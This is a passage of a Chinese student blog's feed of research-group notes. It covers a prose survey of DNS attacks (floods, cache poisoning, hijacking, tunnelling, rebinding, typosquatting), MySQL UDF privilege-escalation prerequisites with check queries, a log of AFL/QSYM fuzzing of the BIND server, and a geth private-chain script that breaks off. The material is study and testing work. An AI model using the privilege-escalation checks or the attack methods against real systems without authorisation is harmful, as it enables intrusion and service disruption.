(Resource Depletion DOS Attack)"></a>SYN Flood (Resource Depletion DOS Attack)</h4><p><img src="https://github.com/jingtianer/home/blob/gh-pages/images/ResDepletionDosAttack.png?raw=true" alt="Resource Depletion DOS Attack"></p><blockquote><p>利用target的ip发起TCP连接，DNS为TCP连接分配资源，最终导致Fail，停止服务</p></blockquote><h4 id="Basic-Cache-Poisoning"><a href="#Basic-Cache-Poisoning" class="headerlink" title="Basic Cache Poisoning"></a>Basic Cache Poisoning</h4><p><img src="https://github.com/jingtianer/home/blob/gh-pages/images/BasicCachePoisoning.png?raw=true" alt="Basic Cache Poisoning"></p><blockquote><p>令本地解析器缓存错误的ip地址</p></blockquote><h4 id="NXDOMAIN-Cache-Exhaustion"><a href="#NXDOMAIN-Cache-Exhaustion" class="headerlink" title="NXDOMAIN Cache Exhaustion"></a>NXDOMAIN Cache Exhaustion</h4><p><img src="https://github.com/jingtianer/home/blob/gh-pages/images/NXDOMAIN.png?raw=true" alt="NXDOMAIN Cache Exhaustion"></p><blockquote><p>攻击者向DNS服务器发送大量不存在的域名的查询请求，导致DNS服务器中存储了大量NXDOMAIN信息，导致其缓存溢出，停止服务</p></blockquote><h4 id="Dos-e-g"><a href="#Dos-e-g" class="headerlink" title="Dos e.g."></a>Dos e.g.</h4><ul><li>Exploit To Fail，<a href="http://www.cvedetails.com/cve/CVE-2002-0400/">Malicious DNS message injection–(CVE-2002-0400)</a><ul><li>Exploit a vulnerability in some element of a name server infrastructure to cause interruption of name resolution service，利用DNS服务器基础结构的某些元素中的漏洞导致名称解析服务中断</li></ul></li><li>Exploit To Own，<a href="http://www.kb.cert.org/vuls/id/844360">Arbitrary&#x2F;remote code execution</a><ul><li>Exploit a vulnerability in some element of a name server infrastructure to gain system administrative privileges，利用DNS服务器基础结构的某些元素中的漏洞获得系统管理特权</li></ul></li><li>Reflection Attack，<a href=""></a></li></ul><h3 id="分布式拒绝服务-DDoS-类攻击"><a href="#分布式拒绝服务-DDoS-类攻击" class="headerlink" title="分布式拒绝服务(DDoS)类攻击"></a>分布式拒绝服务(DDoS)类攻击</h3><ul><li>UDP Flood</li><li>HTTP Flood<ul><li>这两个和SYN Flood相似，发送大量请求导致target资源不足而崩溃</li></ul></li><li>反射式跨站点脚本(XSS)<ul><li>当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。</li><li>通过DNS TXT记录在上注入恶意脚本，当通过Whois服务检查他的域时，脚本会立即执行。</li></ul></li></ul><h3 id="DNS-劫持类攻击"><a href="#DNS-劫持类攻击" class="headerlink" title="DNS 劫持类攻击"></a>DNS 劫持类攻击</h3><p>发生DNS劫持攻击时，网络攻击者会操纵域名查询的解析服务，导致访问被恶意定向至他们控制的非法服务器，这也被成为DNS投毒或DNS重定向攻击。<br>DNS 劫持攻击在网络犯罪领域也很常见。DNS劫持活动还可能破坏或改变合规DNS服务器的工作。除了实施网络钓鱼活动的黑客外，这还可能由信誉良好的实体(比如ISP)完成，其这么做是为了收集信息，用于统计数据、展示广告及其他用途。此外，DNS服务提供商也可能使用流量劫持作为一种审查手段，防止访问特定页面。</p><blockquote><p>通过恶意AP，路由器将DNS请求重定向到攻击者的DNS服务器上</p></blockquote><h4 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h4><p>DNS欺骗又叫DNS缓存中毒，是网络犯罪分子用来诱骗用户连接到他们建立的虚假网站而不是合法网站的一种方法。有人通过域名系统请求访问网站，而DNS服务器回应不准确的IP地址时，这被认为是DNS欺骗攻击。然而，不仅仅是网站容易受到这种攻击。黑客还可以使用这种方法，访问电子邮件账户及其他私密数据。</p><blockquote><p>DNS返回的数据被篡改，返回了不准确的IP地址</p></blockquote><h4 id="Configuration-Poisoning-DNSChanger"><a href="#Configuration-Poisoning-DNSChanger" class="headerlink" title="Configuration Poisoning: DNSChanger"></a>Configuration Poisoning: DNSChanger</h4><p><img src="https://github.com/jingtianer/home/blob/gh-pages/images/ConfigPoisoningDNS.png?raw=true" alt="Configuration Poisoning: DNSChanger"></p><blockquote><p>通过恶意软件修改DNS的配置文件</p></blockquote><h4 id="DNS-Hostname-Overflow-Attack"><a href="#DNS-Hostname-Overflow-Attack" class="headerlink" title="DNS Hostname Overflow Attack"></a>DNS Hostname Overflow Attack</h4><blockquote><p>攻击者返回的消息中包含大于255字节的域名，导致Buffer溢出，使得攻击者可以获得root或执行特权指令</p></blockquote><h4 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h4><p>网络流量可以使用DNS隧道的方式绕过网络过滤器和防火墙等机制，以建立另外的数据传输通道。启用DNS隧道后，用户的连接将通过远程服务器路由传输互联网流量。不幸的是，黑客经常将此用于恶意目的。被恶意使用时，DNS隧道是一种攻击策略，数据通过DNS查询来传递。除了通过平常会阻止这类流量的网络秘密发送数据外，这还可用于欺骗内容、避免过滤或防火墙检测。</p><blockquote><p>利用DNS进行隐蔽通信</p></blockquote><h4 id="DNS重新绑定"><a href="#DNS重新绑定" class="headerlink" title="DNS重新绑定"></a>DNS重新绑定</h4><p>DNS重新绑定是一种网络攻击方法，利用浏览器缓存的长期特性，欺骗受害者的浏览器在输入域名时联系恶意站点。攻击者可以使用任何联网设备（包括智能手机）来实施攻击，不需要任何类型的身份验证。受害者必须禁用浏览历史记录或打开浏览器隐身窗口，才能禁用缓存。利用该漏洞，攻击者可以将受害者浏览器对域名的请求，重新路由到托管有害内容的非法服务器。</p><blockquote><p>一般来说我们的操作系统默认能够将DNS返回来的这个IP地址信息保存60秒，而超过60秒后如果需要再次访问这个域名，就会重新去请求一次dns</p></blockquote><blockquote><p>对于浏览器来说，两次访问的都是同一域名，是符合浏览器的同源策略的，但是第二次访问解析到其他IP，调用到了其他资源。这样的行为被称之为域名重新绑定攻击（DNS ReBinding）。</p></blockquote><blockquote><ul><li>用户第一次访问，解析域名test.gm7.org的IP为104.21.26.222</li><li>在用户第二次访问前，修改域名解析的IP为127.0.0.1</li><li>用户第二次访问，解析域名test.gm7.org的IP为127.0.0.1 (一个不同的ip)</li></ul></blockquote><h4 id="DNS拼写仿冒"><a href="#DNS拼写仿冒" class="headerlink" title="DNS拼写仿冒"></a>DNS拼写仿冒</h4><p>DNS拼写仿冒是一种受DNS劫持启发的社会工程攻击技术，它使用域名中的错别字和拼写错误。常见的DNS拼写仿冒攻击始于攻击者注册一个域名，这个域名和目标的网站域名非常相似。攻击者随后搭建一个虚假网站，网站内容旨在说服用户提供敏感信息，包括登录密码、信用卡资料及其他个人信息。</p><blockquote><p>DNS拼写仿冒是社工技术的一种方法，攻击方注册一个和网站相似的域名来混淆用户。常见在登录密码以及识别验证方面。</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;主机提权&quot;&gt;&lt;a href=&quot;#主机提权&quot; class=&quot;headerlink&quot; title=&quot;主机提权&quot;&gt;&lt;/a&gt;主机提权&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/432182767&quot;&gt;参考&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/304572787&quot;&gt;蓝桥杯教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/linuxprivesc&quot;&gt;tryHackme&lt;/a&gt;，这是一个靶场，提供了21个主机提权的task&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;UDF提权&quot;&gt;&lt;a href=&quot;#UDF提权&quot; class=&quot;headerlink&quot; title=&quot;UDF提权&quot;&gt;&lt;/a&gt;UDF提权&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;UDF全名user-defined function capability&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;它可以通过对MYSQL中的函数调用连接系统上可用的系统动态库&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&quot;UDF攻击条件&quot;&gt;&lt;a href=&quot;#UDF攻击条件&quot; class=&quot;headerlink&quot; title=&quot;UDF攻击条件&quot;&gt;&lt;/a&gt;UDF攻击条件&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;必须获得MYSQL的账号最好是root，然后去到MYSQL里面检查是否拥有insert插入权限，检查命令: &lt;code&gt;select User,Host from user where Insert_priv=&amp;#39;Y&amp;#39;;&lt;/code&gt;是否有输出&lt;/li&gt;
&lt;li&gt;可以更改数据库当然拿到root最好&lt;/li&gt;
&lt;li&gt;允许拷贝文件进来(检查命令: &lt;code&gt;show variables like &amp;#39;local_infile&amp;#39;;&lt;/code&gt;结果为ON才行)&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="主机提权" scheme="https://jingtianer.github.io/home/tags/%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/"/>
    
    <category term="域名解析服务扰乱" scheme="https://jingtianer.github.io/home/tags/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%9C%8D%E5%8A%A1%E6%89%B0%E4%B9%B1/"/>
    
  </entry>
  
  <entry>
    <title>QSYM-afl-环境安装</title>
    <link href="https://jingtianer.github.io/home/2023/01/11/%E7%BB%84%E4%BC%9A/qsym%E5%AF%B9bind%E6%B5%8B%E8%AF%95/"/>
    <id>https://jingtianer.github.io/home/2023/01/11/%E7%BB%84%E4%BC%9A/qsym%E5%AF%B9bind%E6%B5%8B%E8%AF%95/</id>
    <published>2023-01-11T04:15:37.000Z</published>
    <updated>2023-01-14T13:49:41.394Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用afl对bind进行编译"><a class="markdownIt-Anchor" href="#使用afl对bind进行编译"></a> 使用afl对bind进行编译</h2><ul><li>希望使用afl对bind进行编译</li><li>通过<code>./configure -help</code>知道，需要配置下面几个环境变量，达到替换编译器的目的</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=<span class="string">&#x27;afl-gcc&#x27;</span></span><br><span class="line"><span class="built_in">export</span> CXX=<span class="string">&#x27;afl-g++&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>对bind进行编译</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="使用qsym进行测试结合mopt-fast"><a class="markdownIt-Anchor" href="#使用qsym进行测试结合mopt-fast"></a> 使用qsym进行测试（结合MOPT-FAST）</h2><ul><li>使用正常的<code>gcc</code>编译<code>bind</code>，将生成的<code>named</code>复制到<code>test/uninstrumented</code>下 （运行qsym需要）</li><li>使用<code>afl-gcc</code>编译<code>bind</code>，将生成的<code>named</code>复制到<code>test/instrumented</code>下 （运行afl-fuzz的master和slave需要）</li><li>选取<code>MOPT-FAST</code>中的一个测试用例，复制到<code>test/testcase_dir</code></li><li>按照qsym文档的顺序依次启动master，slave和qsym，命令如下</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m 4096 -M afl-master -i testcase_dir/ -o finding_dir/ -- ./instrumented/named</span><br><span class="line">afl-fuzz -m 4096 -S afl-slave -i testcase_dir/ -o finding_dir/ -- ./instrumented/named</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开qsym环境</span></span><br><span class="line"><span class="built_in">source</span> ../qsym/venv/bin/activate</span><br><span class="line">../qsym/bin/run_qsym_afl.py -a afl-slave -o finding_dir/ -n qsym -- ./uninstrumented/named</span><br></pre></td></tr></table></figure><h3 id="问题1"><a class="markdownIt-Anchor" href="#问题1"></a> 问题1</h3><ul><li>报错 Pipe at the beginning of ‘core_pattern’</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> core | sudo <span class="built_in">tee</span> /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><blockquote><p>之前我们创建了一个virtualenv，这次运行第三个命令时，也要先进入这个环境中</p></blockquote><h3 id="master输出"><a class="markdownIt-Anchor" href="#master输出"></a> master输出</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">                     american fuzzy lop 2.57b (afl-master)</span><br><span class="line"></span><br><span class="line">┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐</span><br><span class="line">│        run time : 0 days, 0 hrs, 0 min, 59 sec       │  cycles <span class="keyword">done</span> : 0      │</span><br><span class="line">│   last new path : 0 days, 0 hrs, 0 min, 2 sec        │  total paths : 15     │</span><br><span class="line">│ last <span class="built_in">uniq</span> crash : none seen yet                      │ <span class="built_in">uniq</span> crashes : 0      │</span><br><span class="line">│  last <span class="built_in">uniq</span> hang : none seen yet                      │   <span class="built_in">uniq</span> hangs : 0      │</span><br><span class="line">├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤</span><br><span class="line">│  now processing : 0 (0.00%)         │    map density : 7.53% / 7.59%         │</span><br><span class="line">│ paths timed out : 0 (0.00%)         │ count coverage : 1.01 bits/tuple       │</span><br><span class="line">├─ stage progress ────────────────────┼─ findings <span class="keyword">in</span> depth ────────────────────┤</span><br><span class="line">│  now trying : havoc                 │ favored paths : 1 (6.67%)              │</span><br><span class="line">│ stage execs : 2533/16.4k (15.46%)   │  new edges on : 13 (86.67%)            │</span><br><span class="line">│ total execs : 3608                  │ total crashes : 0 (0 unique)           │</span><br><span class="line">│  <span class="built_in">exec</span> speed : 50.36/sec (slow!)     │  total tmouts : 4 (4 unique)           │</span><br><span class="line">├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤</span><br><span class="line">│   bit flips : 1/32, 0/31, 0/29                      │    levels : 2          │</span><br><span class="line">│  byte flips : 0/4, 0/3, 0/1                         │   pending : 15         │</span><br><span class="line">│ arithmetics : 1/224, 0/25, 0/0                      │  pend fav : 1          │</span><br><span class="line">│  known ints : 0/25, 0/84, 0/44                      │ own finds : 14         │</span><br><span class="line">│  dictionary : 0/0, 0/0, 0/0                         │  imported : 0          │</span><br><span class="line">│       havoc : 0/0, 0/0                              │ stability : 97.85%     │</span><br><span class="line">│        trim : n/a, 0.00%                            ├────────────────────────┘</span><br><span class="line">└─────────────────────────────────────────────────────┘          [cpu000:168%]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="slave-输出"><a class="markdownIt-Anchor" href="#slave-输出"></a> slave 输出</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">   american fuzzy lop 2.57b (afl-slave)</span><br><span class="line"></span><br><span class="line">┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐</span><br><span class="line">│        run time : 0 days, 0 hrs, 0 min, 33 sec       │  cycles <span class="keyword">done</span> : 0      │</span><br><span class="line">│   last new path : 0 days, 0 hrs, 0 min, 4 sec        │  total paths : 14     │</span><br><span class="line">│ last <span class="built_in">uniq</span> crash : none seen yet                      │ <span class="built_in">uniq</span> crashes : 0      │</span><br><span class="line">│  last <span class="built_in">uniq</span> hang : none seen yet                      │   <span class="built_in">uniq</span> hangs : 0      │</span><br><span class="line">├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤</span><br><span class="line">│  now processing : 0 (0.00%)         │    map density : 7.53% / 7.58%         │</span><br><span class="line">│ paths timed out : 0 (0.00%)         │ count coverage : 1.49 bits/tuple       │</span><br><span class="line">├─ stage progress ────────────────────┼─ findings <span class="keyword">in</span> depth ────────────────────┤</span><br><span class="line">│  now trying : havoc                 │ favored paths : 1 (7.14%)              │</span><br><span class="line">│ stage execs : 1163/4096 (28.39%)    │  new edges on : 11 (78.57%)            │</span><br><span class="line">│ total execs : 1700                  │ total crashes : 0 (0 unique)           │</span><br><span class="line">│  <span class="built_in">exec</span> speed : 50.70/sec (slow!)     │  total tmouts : 12 (8 unique)          │</span><br><span class="line">├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤</span><br><span class="line">│   bit flips : n/a, n/a, n/a                         │    levels : 2          │</span><br><span class="line">│  byte flips : n/a, n/a, n/a                         │   pending : 14         │</span><br><span class="line">│ arithmetics : n/a, n/a, n/a                         │  pend fav : 1          │</span><br><span class="line">│  known ints : n/a, n/a, n/a                         │ own finds : 13         │</span><br><span class="line">│  dictionary : n/a, n/a, n/a                         │  imported : 0          │</span><br><span class="line">│       havoc : 0/0, 0/0                              │ stability : 53.47%     │</span><br><span class="line">│        trim : n/a, n/a                              ├────────────────────────┘</span><br><span class="line">└─────────────────────────────────────────────────────┘          [cpu001:166%]</span><br></pre></td></tr></table></figure><h3 id="qsym-输出"><a class="markdownIt-Anchor" href="#qsym-输出"></a> qsym 输出</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(venv) tt@ubuntu:~/Desktop/dns/test$ ../qsym/bin/run_qsym_afl.py -a afl-slave -o finding_dir/ -n qsym -- ./uninstrumented/named</span><br><span class="line">DEBUG:qsym.afl:Temp directory=/tmp/tmpvbo369</span><br><span class="line">DEBUG:qsym.afl:Run qsym: input=finding_dir/afl-slave/queue/id:000037,src:000005,op:havoc,rep:2,+cov</span><br><span class="line">DEBUG:qsym.Executor:Executing <span class="built_in">timeout</span> -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmpvbo369/qsym-out-0/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmpvbo369/qsym-out-0 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/named</span><br><span class="line">DEBUG:qsym.afl:Total=13 s, Emulation=13 s, Solver=0 s, Return=-4</span><br><span class="line">DEBUG:qsym.afl:Generate 0 testcases</span><br><span class="line">DEBUG:qsym.afl:0 testcases are new</span><br><span class="line">DEBUG:qsym.afl:Run qsym: input=finding_dir/afl-slave/queue/id:000032,src:000005,op:havoc,rep:16,+cov</span><br><span class="line">DEBUG:qsym.Executor:Executing <span class="built_in">timeout</span> -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmpvbo369/qsym-out-1/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmpvbo369/qsym-out-1 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/named</span><br><span class="line">DEBUG:qsym.afl:Total=9 s, Emulation=9 s, Solver=0 s, Return=-4</span><br><span class="line">DEBUG:qsym.afl:Generate 0 testcases</span><br><span class="line">DEBUG:qsym.afl:0 testcases are new</span><br><span class="line">DEBUG:qsym.afl:Run qsym: input=finding_dir/afl-slave/queue/id:000024,src:000005,op:havoc,rep:128,+cov</span><br><span class="line">DEBUG:qsym.Executor:Executing <span class="built_in">timeout</span> -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmpvbo369/qsym-out-2/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmpvbo369/qsym-out-2 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/named</span><br></pre></td></tr></table></figure><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><ul><li><p><code>qsym</code>结合<code>mopt</code>对<code>bind</code>的<code>dns</code>服务器进行了测试，<code>afl</code>总共跑了<code>1 days, 11 hrs, 53 min, 22 sec</code>, 并没有生成任何testcase</p></li><li><p>每次输出总伴随这个这个timeout，不知道是什么问题</p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEBUG:qsym.Executor:Executing <span class="built_in">timeout</span> -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmphuJKne/qsym-out-262/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmphuJKne/qsym-out-262 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/named</span><br></pre></td></tr></table></figure><blockquote><p>查看了很多<code>issue</code>，发现上传的日志中大家也都有timeout</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;使用afl对bind进行编译&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#使用afl对bind进行编译&quot;&gt;&lt;/a&gt; 使用afl对bind进行编译&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;希望使用afl对bind进行编译&lt;/li&gt;
&lt;li&gt;通过&lt;code&gt;./configure -help&lt;/code&gt;知道，需要配置下面几个环境变量，达到替换编译器的目的&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; CC=&lt;span class=&quot;string&quot;&gt;&amp;#x27;afl-gcc&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; CXX=&lt;span class=&quot;string&quot;&gt;&amp;#x27;afl-g++&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;对bind进行编译&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;./configure&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo make&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo make install&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;使用qsym进行测试结合mopt-fast&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#使用qsym进行测试结合mopt-fast&quot;&gt;&lt;/a&gt; 使用qsym进行测试（结合MOPT-FAST）&lt;/h2&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="QSYM" scheme="https://jingtianer.github.io/home/tags/QSYM/"/>
    
    <category term="afl" scheme="https://jingtianer.github.io/home/tags/afl/"/>
    
    <category term="bind" scheme="https://jingtianer.github.io/home/tags/bind/"/>
    
    <category term="MOPT" scheme="https://jingtianer.github.io/home/tags/MOPT/"/>
    
  </entry>
  
  <entry>
    <title>geth搭建私链</title>
    <link href="https://jingtianer.github.io/home/2023/01/10/misc/geth%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E9%93%BE/"/>
    <id>https://jingtianer.github.io/home/2023/01/10/misc/geth%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E9%93%BE/</id>
    <published>2023-01-10T03:28:00.000Z</published>
    <updated>2023-01-10T15:25:59.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="主要工作"><a href="#主要工作" class="headerlink" title="主要工作"></a>主要工作</h2><p>参考<code>go-ethereum</code>官网的<a href="https://geth.ethereum.org/docs/fundamentals/private-network">Private Networks</a>文档搭建了一个私有链，并总结出几个脚本，可以半自动化地实现geth网络的搭建，脚本已上传至github仓库<a href="https://github.com/jingtianer/DLCCB">DLCCB</a></p><h2 id="setup-sh"><a href="#setup-sh" class="headerlink" title="setup.sh"></a>setup.sh</h2><ul><li>这一步使用了以下几个工具<ul><li><code>geth</code>命令，用于生成初始两个节点的账户，使用创世块配置文件对两个账户进行初始化</li><li><code>puppeth</code> 用于生成创世块的配置文件，这个命令是交互式的，编写了一个<code>puppeth.txt</code>作为其输入，默认生成一个基于pow的区块链</li><li><code>bootnode</code> 用于生成启动bootnode</li></ul></li><li>这一步使用了以下几个linux命令<ul><li><code>sed</code> 非交互式的文本编辑器，用于读取生成的账户的区块链地址，写入<code>puppeth.txt</code>中，使得<code>puppeth</code>工具能为初始的两个节点分配一定的以太币</li><li><code>awk</code>，用于对文本的处理</li></ul></li></ul><figure class="highlight sh"><figcaption><span>setup.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> node1 node2</span><br><span class="line">geth --datadir node1 account new &lt; password.txt</span><br><span class="line">geth --datadir node2 account new &lt; password.txt</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&quot;5i<span class="subst">$(cat node1/keystore/UTC--* | awk &#x27;&#123;split($0, arr, <span class="string">&quot;\&quot;&quot;</span>)</span>; print arr[4]&#125;&#x27;)&quot;</span> puppeth.txt </span><br><span class="line">sed -i <span class="string">&quot;5i<span class="subst">$(cat node2/keystore/UTC--* | awk &#x27;&#123;split($0, arr, <span class="string">&quot;\&quot;&quot;</span>)</span>; print arr[4]&#125;&#x27;)&quot;</span> puppeth.txt </span><br><span class="line">puppeth &lt; puppeth.txt</span><br><span class="line">sed -i <span class="string">&quot;5d&quot;</span> puppeth.txt</span><br><span class="line">sed -i <span class="string">&quot;5d&quot;</span> puppeth.txt</span><br><span class="line"></span><br><span class="line">geth init --datadir node1 tianer.json</span><br><span class="line">geth init --datadir node2 tianer.json</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> password.txt | <span class="built_in">head</span> -n 1 | <span class="built_in">tee</span> node1/password.txt</span><br><span class="line"><span 